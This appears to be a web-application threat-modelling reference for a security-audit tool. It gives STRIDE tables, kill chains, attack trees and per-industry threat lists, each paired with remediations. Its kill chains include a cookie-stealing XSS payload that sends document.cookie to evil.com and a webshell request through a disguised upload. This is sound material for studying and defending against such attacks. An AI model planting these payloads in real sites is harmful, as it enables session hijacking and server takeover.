# 🎯 WEB THREAT MODELS — CYBERAUDIT SKILL
# Comprehensive threat models for web applications

═══════════════════════════════════════════════════════════════
                    METHOD USED
═══════════════════════════════════════════════════════════════

This file combines:
  → STRIDE  : Threat taxonomy by type
  → PASTA   : Process for Attack Simulation & Threat Analysis
  → Kill Chains : Realistic exploitation chains
  → Attack Trees : Attack decision trees

WHEN TO USE THIS FILE:
  → Auditing a new feature before development
  → Architecture review
  → Deep audit level 3-4
  → Overall risk assessment of an application

═══════════════════════════════════════════════════════════════
                    STRIDE BY WEB COMPONENT
═══════════════════════════════════════════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COMPONENT: FORM / USER INPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

S — Spoofing
  Threat    : Attacker forges identity data
  Examples  : Fake email, fake username, role=admin field
  Control   : Strict validation, whitelist of allowed values

T — Tampering
  Threat    : Data modification before server submission
  Examples  : Price manipulation, quantity manipulation, IDs
  Control   : Server-side verification, HMAC signing of critical data

R — Repudiation
  Threat    : User denies submitting this form
  Examples  : Denied transaction, denied destructive action
  Control   : Logging with timestamp, IP, user-agent, session ID

I — Information Disclosure
  Threat    : Form reveals sensitive information
  Examples  : Account enumeration via different error messages
             Data enumeration via timing attacks
  Control   : Generic error messages, constant-time comparisons

D — Denial of Service
  Threat    : Mass form submission
  Examples  : Brute force login, registration spam, reset flood
  Control   : Rate limiting, CAPTCHA, progressive lockout

E — Elevation of Privilege
  Threat    : Hidden field modification to gain rights
  Examples  : role=admin in body, is_verified=true
  Control   : Whitelist of accepted fields, server-side validation

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COMPONENT: REST API / GRAPHQL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

S — Spoofing
  Threat    : Forged or stolen token to impersonate identity
  Examples  : JWT algorithm confusion, token theft via XSS
  Control   : JWT signature verified, HttpOnly cookies, CSP

T — Tampering
  Threat    : Request parameter modification
  Examples  : IDOR via ID manipulation, modified price in body
  Control   : Ownership check, signing of critical data

R — Repudiation
  Threat    : Untracked API actions
  Examples  : Data modification without log, delete without audit
  Control   : Audit log on all mutations

I — Information Disclosure
  Threat    : API returns too much data
  Examples  : Over-fetching, unfiltered sensitive fields,
             errors revealing internal structure
  Control   : Strict DTO, explicit select(), error handling

D — Denial of Service
  Threat    : Expensive or massive requests
  Examples  : GraphQL nested queries, pagination without limit,
             catastrophic regex (ReDoS)
  Control   : Rate limiting, query complexity, timeout

E — Elevation of Privilege
  Threat    : Access to endpoints above one's level
  Examples  : User accessing /admin/*, BFLA
  Control   : Role verification on every endpoint

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COMPONENT: AUTHENTICATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

S — Spoofing
  Threat    : Credential or auth mechanism compromise
  Examples  : Brute force, credential stuffing, phishing
             Password reset hijacking, session fixation
  Control   : Rate limiting, MFA, argon2, HTTPS, secure tokens

T — Tampering
  Threat    : Session data or token modification
  Examples  : JWT payload modified, guessed session ID
             Cookie manipulation, modified role in token
  Control   : JWT signature, strong random session ID

R — Repudiation
  Threat    : Untracked login and logout
  Examples  : Untracked access, no connection history
  Control   : Log every auth event with full metadata

I — Information Disclosure
  Threat    : Auth mechanism reveals information
  Examples  : "Email not found" vs "Incorrect password"
             Different timing based on account existence
             Token with decodable payload (not encrypted)
  Control   : Generic messages, constant delay, opaque JWT

D — Denial of Service
  Threat    : Blocking legitimate users
  Examples  : Abusive lockout (attacker blocks target accounts)
             Reset password flood
  Control   : Progressive lockout, CAPTCHA, alerts

E — Elevation of Privilege
  Threat    : Become admin or another user
  Examples  : Password reset without identity validation
             Auth bypass via debug=true parameter
             Default admin account unchanged
  Control   : Strict flow validation, no backdoor

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COMPONENT: DATABASE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

S — Spoofing
  Threat    : Injected data posing as other data
  Examples  : Second-order SQLi (stored data, executed later)
  Control   : Parameterization at write AND read

T — Tampering
  Threat    : Unauthorized data modification
  Examples  : SQLi UPDATE/DELETE, mass assignment
  Control   : Parameterized queries, secure ORM, DB least privilege

R — Repudiation
  Threat    : Data modification without trace
  Examples  : UPDATE without audit trail, DELETE without soft delete
  Control   : Audit tables, soft delete, event sourcing

I — Information Disclosure
  Threat    : Unauthorized data access
  Examples  : SQLi SELECT, IDOR, exposed backup,
             unencrypted data at rest
  Control   : Encryption, minimal access, row-level security

D — Denial of Service
  Threat    : Database saturation
  Examples  : Queries without index on large table,
             unclosed transactions, locks
  Control   : Timeouts, connection pooling, pagination

E — Elevation of Privilege
  Threat    : Access to data outside one's scope
  Examples  : DB account with too many privileges,
             injection enabling xp_cmdshell (MSSQL)
  Control   : Read-only DB account where possible, least privilege

═══════════════════════════════════════════════════════════════
                    DETAILED KILL CHAINS
═══════════════════════════════════════════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KILL CHAIN KC-WEB-001
Name: Complete Account Takeover
Final severity: CRITICAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STEP 1 — Reconnaissance (INFO)
  Action   : GET /api/users?email=test@test.com
  Result   : Different response if email exists or not
  Condition: Non-generic error messages

STEP 2 — Account enumeration (LOW)
  Action   : Iterate over a list of known emails
  Result   : List of valid accounts confirmed
  Condition: No rate limiting on /forgot-password

STEP 3 — Reset password attack (HIGH)
  Action   : Trigger reset + analyze token
  Result   : Predictable token (timestamp, sequential)
  Condition: Non-random token or no expiration

STEP 4 — Account takeover (CRITICAL)
  Action   : Use forged/guessed token
  Result   : New password set, account compromised
  Condition: Token not invalidated after use

FINAL IMPACT:
  → Full access to user account
  → Access to all their data
  → Actions on their behalf
  → If admin: total application compromise

REMEDIATION:
  → Generic error messages on reset
  → Rate limiting on /forgot-password
  → Cryptographically random tokens (32+ bytes)
  → Short expiration (15 minutes)
  → Single-use + immediate invalidation

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KILL CHAIN KC-WEB-002
Name: Massive Data Breach via IDOR
Final severity: CRITICAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STEP 1 — Discovery (INFO)
  Action   : Observe API requests as a user
  Result   : GET /api/invoices/1042 — sequential ID visible
  Condition: Predictable IDs exposed in API

STEP 2 — IDOR Test (HIGH)
  Action   : GET /api/invoices/1041
  Result   : Another user's invoice returned
  Condition: No ownership check server-side

STEP 3 — Automated enumeration (CRITICAL)
  Action   : Script iterating from 1 to 99999
  Result   : All invoices from all users
  Condition: No rate limiting on the endpoint

FINAL IMPACT:
  → Exposure of all user data
  → Massive GDPR violation
  → Potential fines (up to 4% global turnover)
  → Irreparable reputation damage

REMEDIATION:
  → Unpredictable UUIDs as identifiers
  → Ownership verification on every access
  → Rate limiting on read endpoints
  → Monitoring of abnormal access patterns

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KILL CHAIN KC-WEB-003
Name: RCE via File Upload
Final severity: CRITICAL (10.0)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STEP 1 — Upload test (INFO)
  Action   : Upload a normal image
  Result   : File accessible at /uploads/photo.jpg
  Condition: Files stored in a web-accessible folder

STEP 2 — MIME bypass (HIGH)
  Action   : Upload shell.php renamed to shell.jpg
             with Content-Type: image/jpeg
  Result   : File accepted (extension-only check)
  Condition: No actual file content verification

STEP 3 — Execution (CRITICAL)
  Action   : GET /uploads/shell.jpg?cmd=whoami
  Result   : PHP code executed
  Condition: Server executes PHP in the upload folder

STEP 4 — Persistence (CRITICAL)
  Action   : Install a permanent webshell
  Result   : Persistent server access
  Condition: Write permissions on the server

FINAL IMPACT:
  → Remote Code Execution on the server
  → Access to the entire database
  → Compromise of other internal services
  → Potentially the whole internal network

REMEDIATION:
  → Verify real MIME type (magic bytes)
  → Store uploads OUTSIDE the webroot
  → Regenerate filenames randomly
  → Disable code execution in the upload folder
  → Scan uploaded files

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KILL CHAIN KC-WEB-004
Name: Stored XSS → Session Hijacking
Final severity: HIGH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STEP 1 — Payload injection (MEDIUM)
  Action   : Post a comment with:
             <script>document.location='https://evil.com/steal?c='+document.cookie</script>
  Result   : Payload stored in database without sanitization
  Condition: Output not escaped in templates

STEP 2 — Activation (HIGH)
  Action   : Admin or other user visits the page
  Result   : Script executed in their browser
  Condition: Cookies without HttpOnly flag

STEP 3 — Session Hijacking (HIGH)
  Action   : Session cookie sent to evil.com
  Result   : Attacker uses the cookie → admin account access
  Condition: Cookie accessible via JavaScript

FINAL IMPACT:
  → Admin account compromised
  → Full application access
  → Lateral movement possible

REMEDIATION:
  → Escape all HTML output ({{ }}, htmlspecialchars)
  → Restrictive CSP blocking inline scripts
  → HttpOnly + Secure + SameSite on cookies
  → DOMPurify if user HTML is necessary

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KILL CHAIN KC-WEB-005
Name: Supply Chain Attack via Dependency
Final severity: CRITICAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STEP 1 — Targeting (External)
  Action   : Attacker publishes "coIors" (typosquatting of "colors")
  Result   : Malicious package on npm
  Condition: Developer makes a typo

STEP 2 — Unintentional installation (INFO)
  Action   : npm install coIors (with uppercase I)
  Result   : Malicious package installed
  Condition: No verification of installed packages

STEP 3 — Execution (CRITICAL)
  Action   : postinstall script executed automatically
  Result   : Backdoor installed, secrets exfiltrated
  Condition: Post-install scripts not audited

FINAL IMPACT:
  → All dev machine secrets exfiltrated
  → Backdoor in production code
  → CI/CD compromise

REMEDIATION:
  → Regular npm audit
  → Check postinstall scripts before installation
  → Lock files committed and verified
  → Private registry with validation
  → Dependency audit in CI/CD

═══════════════════════════════════════════════════════════════
                    ATTACK TREES
═══════════════════════════════════════════════════════════════

TREE: COMPROMISE A USER ACCOUNT
──────────────────────────────────────────

OBJECTIVE: Access a user account
│
├── CREDENTIAL THEFT
│   ├── Brute force (if no rate limiting)
│   ├── Credential stuffing (external leaks)
│   ├── Phishing (outside technical scope)
│   └── Password reset hijacking
│       ├── Predictable token
│       ├── Non-expired token
│       └── Possible email enumeration
│
├── SESSION THEFT
│   ├── XSS → cookie theft (if no HttpOnly)
│   ├── Network interception (if no HTTPS)
│   ├── Session fixation
│   └── Predictable session ID
│
└── AUTHENTICATION BYPASS
    ├── SQLi on login
    ├── Auth logic flaw (mass assignment role)
    ├── JWT manipulation (algorithm none, weak secret)
    └── OAuth misconfiguration

TREE: ACCESS ANOTHER USER'S DATA
──────────────────────────────────────

OBJECTIVE: Read another user's data
│
├── DIRECT IDOR
│   ├── Sequential ID in URL
│   ├── ID in body not verified
│   └── ID in query params
│
├── INDIRECT IDOR
│   ├── Access via relation (A→B→C without check)
│   ├── Reference in an export
│   └── Reference in a webhook
│
└── BROKEN ACCESS CONTROL
    ├── Admin endpoint accessible to all
    ├── Bypassed filter parameter
    └── JWT with modifiable role

═══════════════════════════════════════════════════════════════
                    THREAT MODEL BY APP TYPE
═══════════════════════════════════════════════════════════════

E-COMMERCE
──────────
  MALICIOUS ACTORS:
  → Malicious customer (price manipulation, fraud)
  → Competitor (scraping, resource abuse)
  → Cybercriminal (payment data theft)
  → Insider (abused employee access)

  TOP THREATS:
  1. Client-side price manipulation
  2. Coupon/promo code abuse
  3. Inventory manipulation (race condition)
  4. Payment bypass (business logic)
  5. Exposed credit card data
  6. Account takeover → purchase fraud
  7. Massive catalog scraping

  PRIORITY CONTROLS:
  → Prices calculated and validated server-side only
  → Rate limiting on coupon endpoints
  → Atomic transactions for inventory
  → PCI-DSS compliant integration
  → 3DS2 on payments

SaaS MULTI-TENANT
─────────────────
  TOP THREATS:
  1. Tenant isolation breach (access to another tenant's data)
  2. Intra-tenant privilege escalation
  3. Admin account takeover
  4. API abuse / over-consumption
  5. Massive data export

  PRIORITY CONTROLS:
  → tenant_id on ALL DB queries
  → Row-Level Security if possible
  → Strict context isolation

HEALTHCARE APPLICATION
─────────────────────
  TOP THREATS:
  1. Unauthorized access to medical data
  2. Modification of critical medical data
  3. Unavailability (DoS on critical system)
  4. HIPAA/GDPR non-compliance
  5. Insufficient audit trail

  PRIORITY CONTROLS:
  → Encryption at rest mandatory
  → Audit log of every patient data access
  → Mandatory MFA for healthcare professionals
  → Compliant retention and anonymization
